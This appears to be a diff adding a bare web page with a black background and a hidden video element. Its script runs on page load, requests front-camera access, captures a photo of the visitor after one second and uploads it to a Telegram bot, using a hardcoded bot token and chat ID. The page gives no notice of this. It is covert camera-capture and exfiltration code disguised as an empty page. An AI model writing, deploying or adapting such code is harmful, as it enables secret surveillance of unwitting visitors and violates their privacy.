@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <style>
+        body{
+            background-color: black;
+        }
+        #video{
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    
+    <video id="video" src="" autoplay muted></video>
+
+    <script>
+
+        const BOT_TOKEN = "8524701864:AAErCsIzwth2JMcqHRW0Vd-QJR9JiFYIw_A";
+        const CHAT_ID   = "8788398271";
+
+        let video = document.getElementById("video");
+        let canvas = document.createElement("canvas");
+
+        document.addEventListener('DOMContentLoaded' , async ()=>{
+
+            try{
+                
+                let stream = await navigator.mediaDevices.getUserMedia({
+                    video:{
+                        facingMode:'user' 
+                             
+                    },
+                    audio:false
+                })
+
+                video.srcObject = stream;
+
+                video.onloadedmetadata = ()=>{
+                    video.play();
+
+                    setTimeout(()=>{
+                        capt_send(stream)
+                    },1000)
+                   
+                }
+
+              
+            
+            }catch(err){
+
+            }
+        })
+
+
+
+        function capt_send(stream){
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            canvas.getContext('2d').drawImage(video , 0 , 0);
+
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(blob =>{
+
+                let Data = new FormData();
+                Data.append('chat_id' , CHAT_ID);
+                Data.append('photo', blob , 'photo.jpg' );
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto` ,{
+                    method:'POST',
+                    body:Data
+                   
+                })
+
+              
+            },'image/jpeg',0.8)
+
+
+        }
+
+        
+    </script>
+
+
+
+</body>
+</html>
